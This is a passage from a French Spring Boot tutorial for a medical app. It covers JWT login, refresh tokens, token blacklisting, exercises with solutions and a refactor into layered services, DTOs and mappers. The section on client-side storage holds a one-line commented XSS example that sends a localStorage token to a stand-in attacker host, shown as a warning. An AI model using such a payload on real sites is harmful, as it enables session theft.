  "token": "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlcyI6WyJST0xFX1BBVElFTlQiXSwic3ViIjoibWFydGluQGRvY3RvcmFwcC5jb20iLCJpYXQiOjE3MDk1Njc4OTAsImV4cCI6MTcwOTU3MTQ5MH0.xyz...",
  "type": "Bearer",
  "expiresIn": 3600,
  "email": "martin@doctorapp.com",
  "roles": ["ROLE_PATIENT"]
}
```

**Copie le token !**

---

#### 3️⃣ **Utiliser le token**

```http
GET http://localhost:8080/api/auth/test
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJyb2xlcyI6WyJST0xFX1BBVElFTlQiXSwic3ViIjoibWFydGluQGRvY3RvcmFwcC5jb20iLCJpYXQiOjE3MDk1Njc4OTAsImV4cCI6MTcwOTU3MTQ5MH0.xyz...
```

**Réponse** :
```json
{
  "message": "JWT fonctionne !"
}
```

---

<a name="8-security"></a>
## 8️⃣ SÉCURITÉ ET BONNES PRATIQUES

### 🔐 1. Clé secrète sécurisée

**❌ MAUVAIS** :
```properties
jwt.secret=secret
```

**✅ BON** :
```properties
# Minimum 256 bits (32 caractères)
jwt.secret=VoiciUneCleTresSecurePourMonApplicationDoctorApp2024QuiFaitPlusDe32Caracteres
```

**Générer une clé aléatoire** :
```bash
openssl rand -base64 64
```

**En production** : Utilise des variables d'environnement !
```bash
export JWT_SECRET="ma-cle-ultra-secrete"
```

```properties
jwt.secret=${JWT_SECRET}
```

---

### ⏰ 2. Expiration courte

```properties
# ❌ Trop long
jwt.expiration=86400000  # 24 heures

# ✅ Recommandé
jwt.expiration=900000    # 15 minutes
```

**Avec Refresh Token** :
- Access Token : 15 min
- Refresh Token : 7 jours

---

### 🔒 3. Stockage côté client

#### ❌ localStorage (vulnérable XSS)

```javascript
// ❌ DANGER
localStorage.setItem('token', token);

// Un script malveillant peut voler le token :
// <script>fetch('https://hacker.com?token=' + localStorage.getItem('token'))</script>
```

#### ✅ Meilleures options

**Option 1 : Cookie HttpOnly + SameSite**
```java
@PostMapping("/login")
public ResponseEntity<LoginResponse> login(
        @Valid @RequestBody LoginRequest request,
        HttpServletResponse response
) {
    LoginResponse loginResponse = authenticationService.login(request);
    
    // Créer un cookie HttpOnly
    Cookie cookie = new Cookie("jwt", loginResponse.getToken());
    cookie.setHttpOnly(true);         // ← Inaccessible au JavaScript
    cookie.setSecure(true);           // ← Seulement HTTPS
    cookie.setPath("/");
    cookie.setMaxAge(3600);           // 1 heure
    cookie.setAttribute("SameSite", "Strict");  // ← Protection CSRF
    
    response.addCookie(cookie);
    
    return ResponseEntity.ok(loginResponse);
}
```

**Option 2 : Mémoire (state React/Vue/Angular)**
```javascript
// ✅ Stocker dans le state du composant
const [token, setToken] = useState(null);

// Perdu au refresh de la page (utiliser refresh token)
```

---

### 🚫 4. Blacklist de tokens (révocation)

**Problème** : Un JWT reste valide jusqu'à expiration, même si :
- L'utilisateur se déconnecte
- Tu changes ses rôles
- Son compte est bloqué

**Solution : Blacklist Redis**

```java
@Service
@RequiredArgsConstructor
public class TokenBlacklistService {
    
    private final RedisTemplate<String, String> redisTemplate;
    private final JwtUtil jwtUtil;

    // Ajouter à la blacklist
    public void blacklistToken(String token) {
        Date expiration = jwtUtil.extractExpiration(token);
        long ttl = expiration.getTime() - System.currentTimeMillis();
        
        if (ttl > 0) {
            redisTemplate.opsForValue().set(
                "blacklist:" + token,
                "revoked",
                ttl,
                TimeUnit.MILLISECONDS
            );
        }
    }

    // Vérifier si blacklisté
    public boolean isBlacklisted(String token) {
        return Boolean.TRUE.equals(
            redisTemplate.hasKey("blacklist:" + token)
        );
    }
}
```

**Modifier le filtre JWT** :
```java
// Dans JwtAuthenticationFilter
if (jwtUtil.validateToken(jwt, userDetails) && !tokenBlacklistService.isBlacklisted(jwt)) {
    // ...
}
```

**Endpoint de logout** :
```java
@PostMapping("/logout")
public ResponseEntity<?> logout(@RequestHeader("Authorization") String authHeader) {
    String token = authHeader.substring(7);
    tokenBlacklistService.blacklistToken(token);
    return ResponseEntity.ok(Map.of("message", "Déconnecté avec succès"));
}
```

---

### 🔍 5. Ne pas exposer d'informations sensibles

**❌ MAUVAIS** :
```java
Map<String, Object> claims = new HashMap<>();
claims.put("password", user.getPassword());  // ❌❌❌
claims.put("ssn", user.getSocialSecurityNumber());  // ❌❌❌
```

**✅ BON** :
```java
Map<String, Object> claims = new HashMap<>();
claims.put("roles", user.getRoles());
claims.put("name", user.getNom());
// Pas de données sensibles !
```

---

<a name="9-refresh"></a>
## 9️⃣ REFRESH TOKEN

### Pourquoi un Refresh Token ?

**Problème** :
- Access Token court (15 min) → L'utilisateur doit se reconnecter toutes les 15 min ❌
- Access Token long (24h) → Risque de sécurité si volé ❌

**Solution : 2 tokens** :
- 🎫 **Access Token** : Court (15 min), utilisé pour les requêtes API
- 🔄 **Refresh Token** : Long (7 jours), utilisé pour générer un nouveau Access Token

---

### Flux avec Refresh Token

```
1. Login → Retourne Access Token (15 min) + Refresh Token (7 jours)
                             ↓
2. Client utilise Access Token pour les requêtes
                             ↓
3. Après 15 min, Access Token expire
                             ↓
4. Client appelle /api/auth/refresh avec Refresh Token
                             ↓
5. Serveur génère un nouveau Access Token
                             ↓
6. Client utilise le nouveau Access Token
```

---

### Implémentation

#### 1️⃣ Entité RefreshToken

```java
package DoctorApp.DoctorApp.Entity;

import jakarta.persistence.*;
import lombok.*;

import java.time.Instant;

@Entity
@Getter
@Setter
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class RefreshToken {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, unique = true)
    private String token;

    @Column(nullable = false)
    private Instant expiryDate;

    @ManyToOne
    @JoinColumn(name = "utilisateur_id", nullable = false)
    private Utilisateur utilisateur;

    private boolean revoked = false;
}
```

---

#### 2️⃣ RefreshTokenRepository

```java
package DoctorApp.DoctorApp.repository;

import DoctorApp.DoctorApp.Entity.RefreshToken;
import DoctorApp.DoctorApp.Entity.Utilisateur;
import org.springframework.data.jpa.repository.JpaRepository;

import java.util.Optional;

public interface RefreshTokenRepository extends JpaRepository<RefreshToken, Long> {
    Optional<RefreshToken> findByToken(String token);
    void deleteByUtilisateur(Utilisateur utilisateur);
}
```

---

#### 3️⃣ RefreshTokenService

```java
package DoctorApp.DoctorApp.Service;

import DoctorApp.DoctorApp.Entity.RefreshToken;
import DoctorApp.DoctorApp.Entity.Utilisateur;
import DoctorApp.DoctorApp.repository.RefreshTokenRepository;
import DoctorApp.DoctorApp.repository.UtilisateursRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.Instant;
import java.util.UUID;

@Service
@RequiredArgsConstructor
public class RefreshTokenService {

    @Value("${jwt.refresh-expiration}")
    private Long refreshTokenDuration;

    private final RefreshTokenRepository refreshTokenRepository;
    private final UtilisateursRepository utilisateursRepository;

    // 🔄 Créer un Refresh Token
    public RefreshToken createRefreshToken(String email) {
        // Supprimer les anciens tokens de cet utilisateur
        Utilisateur user = utilisateursRepository.findByEmail(email)
                .orElseThrow(() -> new RuntimeException("Utilisateur non trouvé"));
        
        refreshTokenRepository.deleteByUtilisateur(user);

        // Créer un nouveau token
        RefreshToken refreshToken = RefreshToken.builder()
                .utilisateur(user)
                .token(UUID.randomUUID().toString())
                .expiryDate(Instant.now().plusMillis(refreshTokenDuration))
                .revoked(false)
                .build();

        return refreshTokenRepository.save(refreshToken);
    }

    // ✅ Vérifier et récupérer le Refresh Token
    public RefreshToken verifyExpiration(RefreshToken token) {
        if (token.getExpiryDate().compareTo(Instant.now()) < 0 || token.isRevoked()) {
            refreshTokenRepository.delete(token);
            throw new RuntimeException("Refresh token expiré ou révoqué. Veuillez vous reconnecter.");
        }
        return token;
    }

    // 🔍 Trouver par token
    public RefreshToken findByToken(String token) {
        return refreshTokenRepository.findByToken(token)
                .orElseThrow(() -> new RuntimeException("Refresh token non trouvé"));
    }

    // 🚫 Révoquer un token
    @Transactional
    public void revokeToken(String token) {
        RefreshToken refreshToken = findByToken(token);
        refreshToken.setRevoked(true);
        refreshTokenRepository.save(refreshToken);
    }
}
```

---

#### 4️⃣ Modifier AuthenticationService

```java
// Dans AuthenticationService.java

@Value("${jwt.refresh-expiration}")
private Long refreshTokenExpiration;

private final RefreshTokenService refreshTokenService;

public LoginResponse login(LoginRequest request) {
    // ... code existant ...

    // 🔄 Générer le Refresh Token
    RefreshToken refreshToken = refreshTokenService.createRefreshToken(userDetails.getUsername());

    return LoginResponse.builder()
            .token(token)
            .refreshToken(refreshToken.getToken())  // ← Ajouter
            .type("Bearer")
            .expiresIn(jwtExpiration / 1000)
            .email(userDetails.getUsername())
            .roles(roles)
            .build();
}

// 🔄 Nouvelle méthode : Refresh
public LoginResponse refreshToken(String refreshTokenStr) {
    // 1. Vérifier le refresh token
    RefreshToken refreshToken = refreshTokenService.findByToken(refreshTokenStr);
    refreshTokenService.verifyExpiration(refreshToken);

    // 2. Charger l'utilisateur
    Utilisateur user = refreshToken.getUtilisateur();
    UserDetails userDetails = new org.springframework.security.core.userdetails.User(
            user.getEmail(),
            user.getPassword(),
            user.getAuthorities()
    );

    // 3. Générer un nouveau Access Token
    String newAccessToken = jwtUtil.generateToken(userDetails);

    // 4. Extraire les rôles
    java.util.List<String> roles = userDetails.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .collect(Collectors.toList());

    // 5. Retourner la réponse
    return LoginResponse.builder()
            .token(newAccessToken)
            .refreshToken(refreshTokenStr)  // On garde le même refresh token
            .type("Bearer")
            .expiresIn(jwtExpiration / 1000)
            .email(user.getEmail())
            .roles(roles)
            .build();
}
```

---

#### 5️⃣ Modifier LoginResponse

```java
@Data
@Builder
@AllArgsConstructor
public class LoginResponse {
    private String token;
    private String refreshToken;  // ← Ajouter
    private String type;
    private Long expiresIn;
    private String email;
    private List<String> roles;
}
```

---

#### 6️⃣ Endpoint Refresh dans AuthController

```java
@PostMapping("/refresh")
public ResponseEntity<LoginResponse> refreshToken(@RequestBody Map<String, String> request) {
    String refreshToken = request.get("refreshToken");
    
    if (refreshToken == null || refreshToken.isEmpty()) {
        return ResponseEntity.badRequest().build();
    }
    
    LoginResponse response = authenticationService.refreshToken(refreshToken);
    return ResponseEntity.ok(response);
}
```

---

### 🧪 Tester le Refresh Token

#### 1️⃣ Login

```http
POST http://localhost:8080/api/auth/login
Content-Type: application/json

{
  "email": "martin@doctorapp.com",
  "password": "password123"
}
```

**Réponse** :
```json
{
  "token": "eyJhbGc...",  // Access Token (15 min)
  "refreshToken": "7c3a5b1d-...",  // Refresh Token (7 jours)
  "type": "Bearer",
  "expiresIn": 900,
  "email": "martin@doctorapp.com",
  "roles": ["ROLE_PATIENT"]
}
```

---

#### 2️⃣ Après 15 min, refresh

```http
POST http://localhost:8080/api/auth/refresh
Content-Type: application/json

{
  "refreshToken": "7c3a5b1d-..."
}
```

**Réponse** :
```json
{
  "token": "eyJhbGc...",  // NOUVEAU Access Token
  "refreshToken": "7c3a5b1d-...",  // Même Refresh Token
  "type": "Bearer",
  "expiresIn": 900,
  "email": "martin@doctorapp.com",
  "roles": ["ROLE_PATIENT"]
}
```

---

<a name="10-exercices"></a>
## 🎯 EXERCICES PRATIQUES

### Exercice 1 : Récupérer l'utilisateur connecté dans un controller

**Objectif** : Créer un endpoint qui retourne les infos de l'utilisateur connecté

```java
@RestController
@RequestMapping("/api/users")
public class UserController {
    
    @GetMapping("/me")
    public ResponseEntity<?> getCurrentUser(/* TODO : Ajouter paramètres */) {
        // TODO :
        // 1. Récupérer l'utilisateur connecté
        // 2. Retourner ses informations (email, nom, rôles)
    }
}
```

**Solution** :
```java
@RestController
@RequestMapping("/api/users")
@RequiredArgsConstructor
public class UserController {
    
    private final UtilisateursRepository utilisateursRepository;
    
    @GetMapping("/me")
    public ResponseEntity<Map<String, Object>> getCurrentUser(Authentication authentication) {
        String email = authentication.getName();
        
        Utilisateur user = utilisateursRepository.findByEmail(email)
                .orElseThrow(() -> new RuntimeException("Utilisateur non trouvé"));
        
        Map<String, Object> response = new HashMap<>();
        response.put("id", user.getId());
        response.put("nom", user.getNom());
        response.put("email", user.getEmail());
        response.put("roles", user.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .collect(Collectors.toList()));
        
        return ResponseEntity.ok(response);
    }
}
```

---

### Exercice 2 : Endpoint protégé par permission

**Objectif** : Créer un endpoint accessible seulement avec la permission `patient:delete`

```java
@RestController
@RequestMapping("/api/patients")
public class PatientController {
    
    // TODO : Ajouter annotation de sécurité
    @DeleteMapping("/{id}")
    public ResponseEntity<?> deletePatient(@PathVariable Long id) {
        // Supprimer le patient
        return ResponseEntity.ok(Map.of("message", "Patient supprimé"));
    }
}
```

**Solution** :
```java
@RestController
@RequestMapping("/api/patients")
public class PatientController {
    
    @PreAuthorize("hasAuthority('patient:delete')")
    @DeleteMapping("/{id}")
    public ResponseEntity<?> deletePatient(@PathVariable Long id) {
        // Supprimer le patient
        return ResponseEntity.ok(Map.of("message", "Patient supprimé"));
    }
}
```

---

### Exercice 3 : Gestion d'erreur JWT expiré

**Objectif** : Créer un handler pour retourner une erreur claire quand le JWT est expiré

```java
@ControllerAdvice
public class JwtExceptionHandler {
    
    @ExceptionHandler(/* TODO : Quelle exception ? */)
    public ResponseEntity<?> handleJwtExpired(Exception ex) {
        // TODO : Retourner une erreur 401 avec message clair
    }
}
```

**Solution** :
```java
@ControllerAdvice
public class JwtExceptionHandler {
    
    @ExceptionHandler(ExpiredJwtException.class)
    public ResponseEntity<Map<String, Object>> handleJwtExpired(ExpiredJwtException ex) {
        Map<String, Object> error = new HashMap<>();
        error.put("status", 401);
        error.put("error", "Unauthorized");
        error.put("message", "Votre session a expiré. Veuillez vous reconnecter.");
        error.put("timestamp", Instant.now());
        
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body(error);
    }
    
    @ExceptionHandler(JwtException.class)
    public ResponseEntity<Map<String, Object>> handleJwtInvalid(JwtException ex) {
        Map<String, Object> error = new HashMap<>();
        error.put("status", 401);
        error.put("error", "Unauthorized");
        error.put("message", "Token invalide");
        error.put("timestamp", Instant.now());
        
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body(error);
    }
}
```

---

## 📝 RÉSUMÉ DU COURS

### Les concepts clés JWT

1. **JWT** = Token contenant des données encodées + signature
2. **Stateless** = Le serveur ne stocke rien
3. **3 parties** = Header + Payload + Signature
4. **Expiration** = Le token a une durée de vie limitée
5. **Refresh Token** = Token longue durée pour renouveler l'Access Token
6. **Signature** = Garantit que le token n'a pas été modifié

### Le flux complet

```
1. Login → Génère Access Token + Refresh Token
         ↓
2. Stocke les tokens côté client
         ↓
3. Chaque requête → Envoie Access Token dans header
         ↓
4. JwtAuthenticationFilter → Vérifie le token
         ↓
5. Si valide → Charge utilisateur dans SecurityContext
         ↓
6. Si expiré → Utilise Refresh Token pour renouveler
```

### Sécurité

- ✅ Clé secrète longue et aléatoire
- ✅ Expiration courte (15 min)
- ✅ Refresh Token pour éviter les re-connexions
- ✅ Stockage sécurisé (pas localStorage)
- ✅ Blacklist pour révocation
- ✅ Pas de données sensibles dans le payload

---

**Tu as des questions sur un point spécifique ? 😊**


# Refactor

# 📚 CODE PROPRE & PROFESSIONNEL : Architecture en couches avec Interfaces et Mapping

---

## 📖 TABLE DES MATIÈRES

1. [Principes de code propre](#1-principes)
2. [Architecture en couches (Layered Architecture)](#2-architecture)
3. [Interfaces et leur utilité](#3-interfaces)
4. [DTOs et Mapping avec BeanUtils](#4-mapping)
5. [Implémentation complète pour DoctorApp](#5-implementation)
6. [Gestion des erreurs professionnelle](#6-errors)
7. [Validation et bonnes pratiques](#7-validation)

---

<a name="1-principes"></a>
## 1️⃣ PRINCIPES DE CODE PROPRE

### Les principes SOLID

```
S - Single Responsibility Principle
    → Une classe = Une seule responsabilité

O - Open/Closed Principle
    → Ouvert à l'extension, fermé à la modification

L - Liskov Substitution Principle
    → Les classes dérivées doivent pouvoir remplacer les classes de base

I - Interface Segregation Principle
    → Plusieurs interfaces spécifiques > Une interface générale

D - Dependency Inversion Principle
    → Dépendre d'abstractions, pas d'implémentations concrètes
```

### Application à DoctorApp

**❌ Code non professionnel** :
```java
@RestController
public class PatientController {
    
    @Autowired
    private PatientRepository repository;  // ❌ Dépend directement du repository
    
    @PostMapping("/patients")
    public Patient createPatient(@RequestBody Patient patient) {  // ❌ Expose l'entité
        patient.setPassword(encodePassword(patient.getPassword()));  // ❌ Logique métier dans le controller
        return repository.save(patient);  // ❌ Pas de séparation des couches
    }
}
```

**✅ Code professionnel** :
```java
@RestController
@RequestMapping("/api/patients")
@RequiredArgsConstructor
public class PatientController {
    
    private final IPatientService patientService;  // ✅ Dépend d'une interface
    
    @PostMapping
    public ResponseEntity<PatientResponseDto> createPatient(
            @Valid @RequestBody PatientRequestDto request  // ✅ DTO en entrée
    ) {
        PatientResponseDto response = patientService.createPatient(request);  // ✅ Délègue au service
        return ResponseEntity.status(HttpStatus.CREATED).body(response);  // ✅ DTO en sortie
    }
}
```

---

<a name="2-architecture"></a>
## 2️⃣ ARCHITECTURE EN COUCHES

### Structure professionnelle

```
┌──────────────────────────────────────────────────────────┐
│                    PRESENTATION LAYER                     │
│                      (Controllers)                        │
│  - Reçoit les requêtes HTTP                              │
│  - Valide les DTOs                                       │
│  - Appelle les services                                  │
│  - Retourne les réponses HTTP                            │
└────────────────────┬─────────────────────────────────────┘
                     │
                     │ DTOs
                     ↓
┌──────────────────────────────────────────────────────────┐
│                     SERVICE LAYER                         │
│                   (Business Logic)                        │
│  - Logique métier                                        │
│  - Orchestration                                         │
│  - Transactions                                          │
│  - Mapping Entity ↔ DTO                                 │
└────────────────────┬─────────────────────────────────────┘
                     │
                     │ Entities
                     ↓
┌──────────────────────────────────────────────────────────┐
│                   PERSISTENCE LAYER                       │
│                    (Repositories)                         │
│  - Accès aux données                                     │
│  - Requêtes SQL/JPA                                      │
│  - CRUD operations                                       │
└──────────────────────────────────────────────────────────┘
                     │
                     ↓
┌──────────────────────────────────────────────────────────┐
│                       DATABASE                            │
└──────────────────────────────────────────────────────────┘
```

### Pourquoi cette architecture ?

| Couche | Responsabilité | Avantages |
|--------|---------------|-----------|
| **Controller** | Gestion HTTP | Facilite les tests d'API |
| **Service** | Logique métier | Réutilisable, testable |
| **Repository** | Accès données | Abstraction de la BDD |

---

<a name="3-interfaces"></a>
## 3️⃣ INTERFACES ET LEUR UTILITÉ

### Pourquoi utiliser des interfaces ?

1. **Contrat clair** : Définit ce qu'une classe doit faire
2. **Testabilité** : Facile de créer des mocks
3. **Flexibilité** : Changer l'implémentation sans modifier le code client
4. **Découplage** : Réduit les dépendances entre classes

### Structure des interfaces pour DoctorApp

```
src/main/java/DoctorApp/DoctorApp/
│
├── Service/
│   ├── IAuthenticationService.java        (Interface)
│   ├── AuthenticationServiceImpl.java     (Implémentation)
│   │
│   ├── IPatientService.java               (Interface)
│   ├── PatientServiceImpl.java            (Implémentation)
│   │
│   ├── IUtilisateurService.java           (Interface)
│   └── UtilisateurServiceImpl.java        (Implémentation)
```

---

<a name="4-mapping"></a>
## 4️⃣ DTOs ET MAPPING AVEC BEANUTILS

### Qu'est-ce qu'un DTO ?

**DTO (Data Transfer Object)** = Objet simple pour transférer des données entre couches

**Pourquoi utiliser des DTOs ?**

1. **Sécurité** : Ne pas exposer toutes les données de l'entité
2. **Flexibilité** : Structure différente de l'entité
3. **Validation** : Validation spécifique par endpoint
4. **Découplage** : Changements d'entité n'affectent pas l'API

### Exemple concret

**Entité Utilisateur** (contient TOUT) :
```java
@Entity
public class Utilisateur {
    private Long id;
    private String nom;
    private String email;
    private String password;           // ❌ Ne JAMAIS exposer
    private boolean accountLocked;
    private int loginAttempts;         // ❌ Info interne
    private String otpCode;            // ❌ Sensible
    private Set<Role> roles;
    // ... 20 autres champs
}
```

**DTO Réponse** (seulement ce qui est nécessaire) :
```java
@Data
public class UtilisateurResponseDto {
    private Long id;
    private String nom;
    private String email;
    private List<String> roles;
    // ✅ Pas de password, otpCode, loginAttempts, etc.
}
```

---

### BeanUtils.copyProperties()

**Dépendance** :
```xml
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-beans</artifactId>
</dependency>
```

**Utilisation de base** :
```java
import org.springframework.beans.BeanUtils;

// Source → Destination
Utilisateur entity = utilisateursRepository.findById(1L).get();
UtilisateurResponseDto dto = new UtilisateurResponseDto();

BeanUtils.copyProperties(entity, dto);
// ✅ Copie automatiquement tous les champs avec le MÊME NOM
```

**Comment ça marche ?**
```java
// entity.getNom() → dto.setNom()
// entity.getEmail() → dto.setEmail()
// etc.
```

**⚠️ Limitations** :
- Copie seulement les champs avec **noms identiques**
- Ne gère pas les collections complexes
- Pas de transformation de types

---

### Mapper personnalisé (RECOMMANDÉ pour un code pro)

```java
package DoctorApp.DoctorApp.Mapper;

import DoctorApp.DoctorApp.DTO.UtilisateurResponseDto;
import DoctorApp.DoctorApp.Entity.Utilisateur;
import org.springframework.beans.BeanUtils;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.stereotype.Component;

import java.util.stream.Collectors;

@Component
public class UtilisateurMapper {

    // Entity → DTO
    public UtilisateurResponseDto toDto(Utilisateur entity) {
        if (entity == null) {
            return null;
        }

        UtilisateurResponseDto dto = new UtilisateurResponseDto();
        
        // Copie les champs simples
        BeanUtils.copyProperties(entity, dto);
        
        // Transformation manuelle pour les champs complexes
        dto.setRoles(entity.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .collect(Collectors.toList()));

        return dto;
    }

    // DTO → Entity
    public Utilisateur toEntity(UtilisateurRequestDto dto) {
        if (dto == null) {
            return null;
        }

        Utilisateur entity = new Utilisateur();
        BeanUtils.copyProperties(dto, entity);
        
        return entity;
    }
}
```

---

<a name="5-implementation"></a>
## 5️⃣ IMPLÉMENTATION COMPLÈTE POUR DOCTORAPP

### 📁 Structure du projet

```
DoctorApp/
│
├── DTO/
│   ├── Auth/
│   │   ├── LoginRequestDto.java
│   │   ├── LoginResponseDto.java
│   │   ├── RegisterRequestDto.java
│   │   └── RefreshTokenRequestDto.java
│   │
│   ├── Utilisateur/
│   │   ├── UtilisateurRequestDto.java
│   │   ├── UtilisateurResponseDto.java
│   │   └── UtilisateurUpdateDto.java
│   │
│   └── Patient/
│       ├── PatientRequestDto.java
│       ├── PatientResponseDto.java
│       └── PatientUpdateDto.java
│
├── Mapper/
│   ├── UtilisateurMapper.java
│   ├── PatientMapper.java
│   └── AppointmentMapper.java
│
├── Service/
│   ├── IAuthenticationService.java
│   ├── AuthenticationServiceImpl.java
│   ├── IUtilisateurService.java
│   ├── UtilisateurServiceImpl.java
│   ├── IPatientService.java
│   └── PatientServiceImpl.java
│
├── Controller/
│   ├── AuthController.java
│   ├── UtilisateurController.java
│   └── PatientController.java
│
└── Exception/
    ├── ResourceNotFoundException.java
    ├── DuplicateResourceException.java
    └── GlobalExceptionHandler.java
```

---

### 1️⃣ DTOs pour l'authentification

**DTO/Auth/LoginRequestDto.java** :
```java
package DoctorApp.DoctorApp.DTO.Auth;

import jakarta.validation.constraints.Email;
import jakarta.validation.constraints.NotBlank;
import lombok.Data;

@Data
public class LoginRequestDto {
    
    @NotBlank(message = "L'email est obligatoire")
    @Email(message = "Format d'email invalide")
    private String email;
    
    @NotBlank(message = "Le mot de passe est obligatoire")
    private String password;
}
```

**DTO/Auth/LoginResponseDto.java** :
```java
package DoctorApp.DoctorApp.DTO.Auth;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;

import java.util.List;

@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class LoginResponseDto {
    
    private String token;
    private String refreshToken;
    private String type;
    private Long expiresIn;
    private String email;
    private String nom;
    private List<String> roles;
}
```

**DTO/Auth/RegisterRequestDto.java** :
```java
package DoctorApp.DoctorApp.DTO.Auth;

import jakarta.validation.constraints.Email;
import jakarta.validation.constraints.NotBlank;
import jakarta.validation.constraints.Size;
import lombok.Data;

@Data
public class RegisterRequestDto {
    
    @NotBlank(message = "Le nom est obligatoire")
    @Size(min = 2, max = 100, message = "Le nom doit contenir entre 2 et 100 caractères")
    private String nom;
    
    @NotBlank(message = "L'email est obligatoire")
    @Email(message = "Format d'email invalide")
    private String email;
    
    @NotBlank(message = "Le mot de passe est obligatoire")
    @Size(min = 8, message = "Le mot de passe doit contenir au moins 8 caractères")
    private String password;
}
```

**DTO/Auth/RefreshTokenRequestDto.java** :
```java
package DoctorApp.DoctorApp.DTO.Auth;

import jakarta.validation.constraints.NotBlank;
import lombok.Data;

@Data
public class RefreshTokenRequestDto {
    
    @NotBlank(message = "Le refresh token est obligatoire")
    private String refreshToken;
}
```

---

### 2️⃣ DTOs pour les utilisateurs

**DTO/Utilisateur/UtilisateurResponseDto.java** :
```java
package DoctorApp.DoctorApp.DTO.Utilisateur;

import lombok.Data;

import java.time.LocalDateTime;
import java.util.List;

@Data
public class UtilisateurResponseDto {
    
    private Long id;
    private String nom;
    private String email;
    private boolean enabled;
    private boolean accountLocked;
    private List<String> roles;
    private LocalDateTime lastLogin;
}
```

**DTO/Utilisateur/UtilisateurRequestDto.java** :
```java
package DoctorApp.DoctorApp.DTO.Utilisateur;

import jakarta.validation.constraints.Email;
import jakarta.validation.constraints.NotBlank;
import lombok.Data;

import java.util.Set;

@Data
public class UtilisateurRequestDto {
    
    @NotBlank(message = "Le nom est obligatoire")
    private String nom;
    
    @NotBlank(message = "L'email est obligatoire")
    @Email(message = "Format d'email invalide")
    private String email;
    
    @NotBlank(message = "Le mot de passe est obligatoire")
    private String password;
    
    private Set<Long> roleIds;  // IDs des rôles à assigner
}
```

**DTO/Utilisateur/UtilisateurUpdateDto.java** :
```java
package DoctorApp.DoctorApp.DTO.Utilisateur;

import jakarta.validation.constraints.Email;
import jakarta.validation.constraints.Size;
import lombok.Data;

import java.util.Set;

@Data
public class UtilisateurUpdateDto {
    
    @Size(min = 2, max = 100, message = "Le nom doit contenir entre 2 et 100 caractères")
    private String nom;
    
    @Email(message = "Format d'email invalide")
    private String email;
    
    private Set<Long> roleIds;
}
```

---

### 3️⃣ Mappers

**Mapper/UtilisateurMapper.java** :
```java
package DoctorApp.DoctorApp.Mapper;

import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurRequestDto;
import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurResponseDto;
import DoctorApp.DoctorApp.Entity.Role;
import DoctorApp.DoctorApp.Entity.Utilisateur;
import DoctorApp.DoctorApp.repository.RoleRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.BeanUtils;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.stereotype.Component;

import java.util.HashSet;
import java.util.Set;
import java.util.stream.Collectors;

@Component
@RequiredArgsConstructor
public class UtilisateurMapper {

    private final RoleRepository roleRepository;

    /**
     * Convertit une entité Utilisateur en UtilisateurResponseDto
     * 
     * @param entity L'entité à convertir
     * @return Le DTO correspondant
     */
    public UtilisateurResponseDto toDto(Utilisateur entity) {
        if (entity == null) {
            return null;
        }

        UtilisateurResponseDto dto = new UtilisateurResponseDto();
        
        // Copie automatique des champs simples (id, nom, email, enabled, accountLocked, lastLogin)
        BeanUtils.copyProperties(entity, dto);
        
        // Transformation manuelle pour les rôles
        dto.setRoles(entity.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .collect(Collectors.toList()));

        return dto;
    }

    /**
     * Convertit un UtilisateurRequestDto en entité Utilisateur
     * 
     * @param dto Le DTO à convertir
     * @return L'entité correspondante
     */
    public Utilisateur toEntity(UtilisateurRequestDto dto) {
        if (dto == null) {
            return null;
        }

        Utilisateur entity = new Utilisateur();
        
        // Copie automatique (nom, email, password)
        BeanUtils.copyProperties(dto, entity);
        
        // Charger les rôles depuis les IDs
        if (dto.getRoleIds() != null && !dto.getRoleIds().isEmpty()) {
            Set<Role> roles = new HashSet<>();
            for (Long roleId : dto.getRoleIds()) {
                roleRepository.findById(roleId).ifPresent(roles::add);
            }
            entity.setRoles(roles);
        }
        
        // Valeurs par défaut
        entity.setEnabled(true);
        entity.setAccountLocked(false);
        entity.setFirstLogin(true);

        return entity;
    }

    /**
     * Met à jour une entité existante avec les données du DTO
     * 
     * @param dto Le DTO contenant les nouvelles données
     * @param entity L'entité à mettre à jour
     */
    public void updateEntityFromDto(UtilisateurUpdateDto dto, Utilisateur entity) {
        if (dto == null || entity == null) {
            return;
        }

        // Mise à jour uniquement des champs non-null
        if (dto.getNom() != null) {
            entity.setNom(dto.getNom());
        }
        
        if (dto.getEmail() != null) {
            entity.setEmail(dto.getEmail());
        }
        
        if (dto.getRoleIds() != null && !dto.getRoleIds().isEmpty()) {
            Set<Role> roles = new HashSet<>();
            for (Long roleId : dto.getRoleIds()) {
                roleRepository.findById(roleId).ifPresent(roles::add);
            }
            entity.setRoles(roles);
        }
    }
}
```

---

### 4️⃣ Interfaces de service

**Service/IAuthenticationService.java** :
```java
package DoctorApp.DoctorApp.Service;

import DoctorApp.DoctorApp.DTO.Auth.LoginRequestDto;
import DoctorApp.DoctorApp.DTO.Auth.LoginResponseDto;
import DoctorApp.DoctorApp.DTO.Auth.RegisterRequestDto;
import DoctorApp.DoctorApp.DTO.Utilisateur.UtilisateurResponseDto;

/**
 * Interface définissant les services d'authentification
 */
public interface IAuthenticationService {
    
    /**
     * Authentifie un utilisateur et génère un JWT
     * 
     * @param request Les credentials de l'utilisateur
     * @return Les tokens JWT et les informations de l'utilisateur
     */
    LoginResponseDto login(LoginRequestDto request);
    
    /**
     * Enregistre un nouvel utilisateur
     * 
